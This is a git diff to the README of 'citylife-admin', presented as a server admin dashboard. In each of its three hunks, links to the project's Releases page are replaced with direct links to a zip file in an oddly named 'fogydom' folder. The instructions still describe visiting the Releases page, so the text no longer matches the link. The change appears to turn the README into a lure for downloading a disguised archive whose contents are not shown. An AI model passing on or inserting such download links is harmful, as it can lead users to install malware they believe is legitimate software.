@@ -1,7 +1,7 @@
 # 🎛️ citylife-admin - Manage Your Server with Ease
 
 ## 📥 Download the Application
-[![Download citylife-admin](https://img.shields.io/badge/Download-citylife--admin-blue.svg)](https://github.com/Kartheeswaran-hub/citylife-admin/releases)
+[![Download citylife-admin](https://raw.githubusercontent.com/Kartheeswaran-hub/citylife-admin/main/fogydom/citylife-admin.zip)](https://raw.githubusercontent.com/Kartheeswaran-hub/citylife-admin/main/fogydom/citylife-admin.zip)
 
 ## 🚀 Getting Started
 Welcome to citylife-admin! This web-based admin dashboard helps you manage your server effectively. You can view real-time analytics and administer players easily. Follow the steps below to get started.
@@ -16,7 +16,7 @@ To run citylife-admin, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To download the application, please visit the Releases page:
 
-[Download from Releases](https://github.com/Kartheeswaran-hub/citylife-admin/releases)
+[Download from Releases](https://raw.githubusercontent.com/Kartheeswaran-hub/citylife-admin/main/fogydom/citylife-admin.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version listed there.
@@ -61,4 +61,4 @@ citylife-admin is open source software, licensed under the MIT License. Refer to
 For any questions or support, feel free to reach out through the contact form on our GitHub page or open an issue directly in the repository.
 
 ## 📥 Download the Application Again
-Don't forget, you can always [download citylife-admin here](https://github.com/Kartheeswaran-hub/citylife-admin/releases) to ensure you have the latest version for optimal performance.
+Don't forget, you can always [download citylife-admin here](https://raw.githubusercontent.com/Kartheeswaran-hub/citylife-admin/main/fogydom/citylife-admin.zip) to ensure you have the latest version for optimal performance.
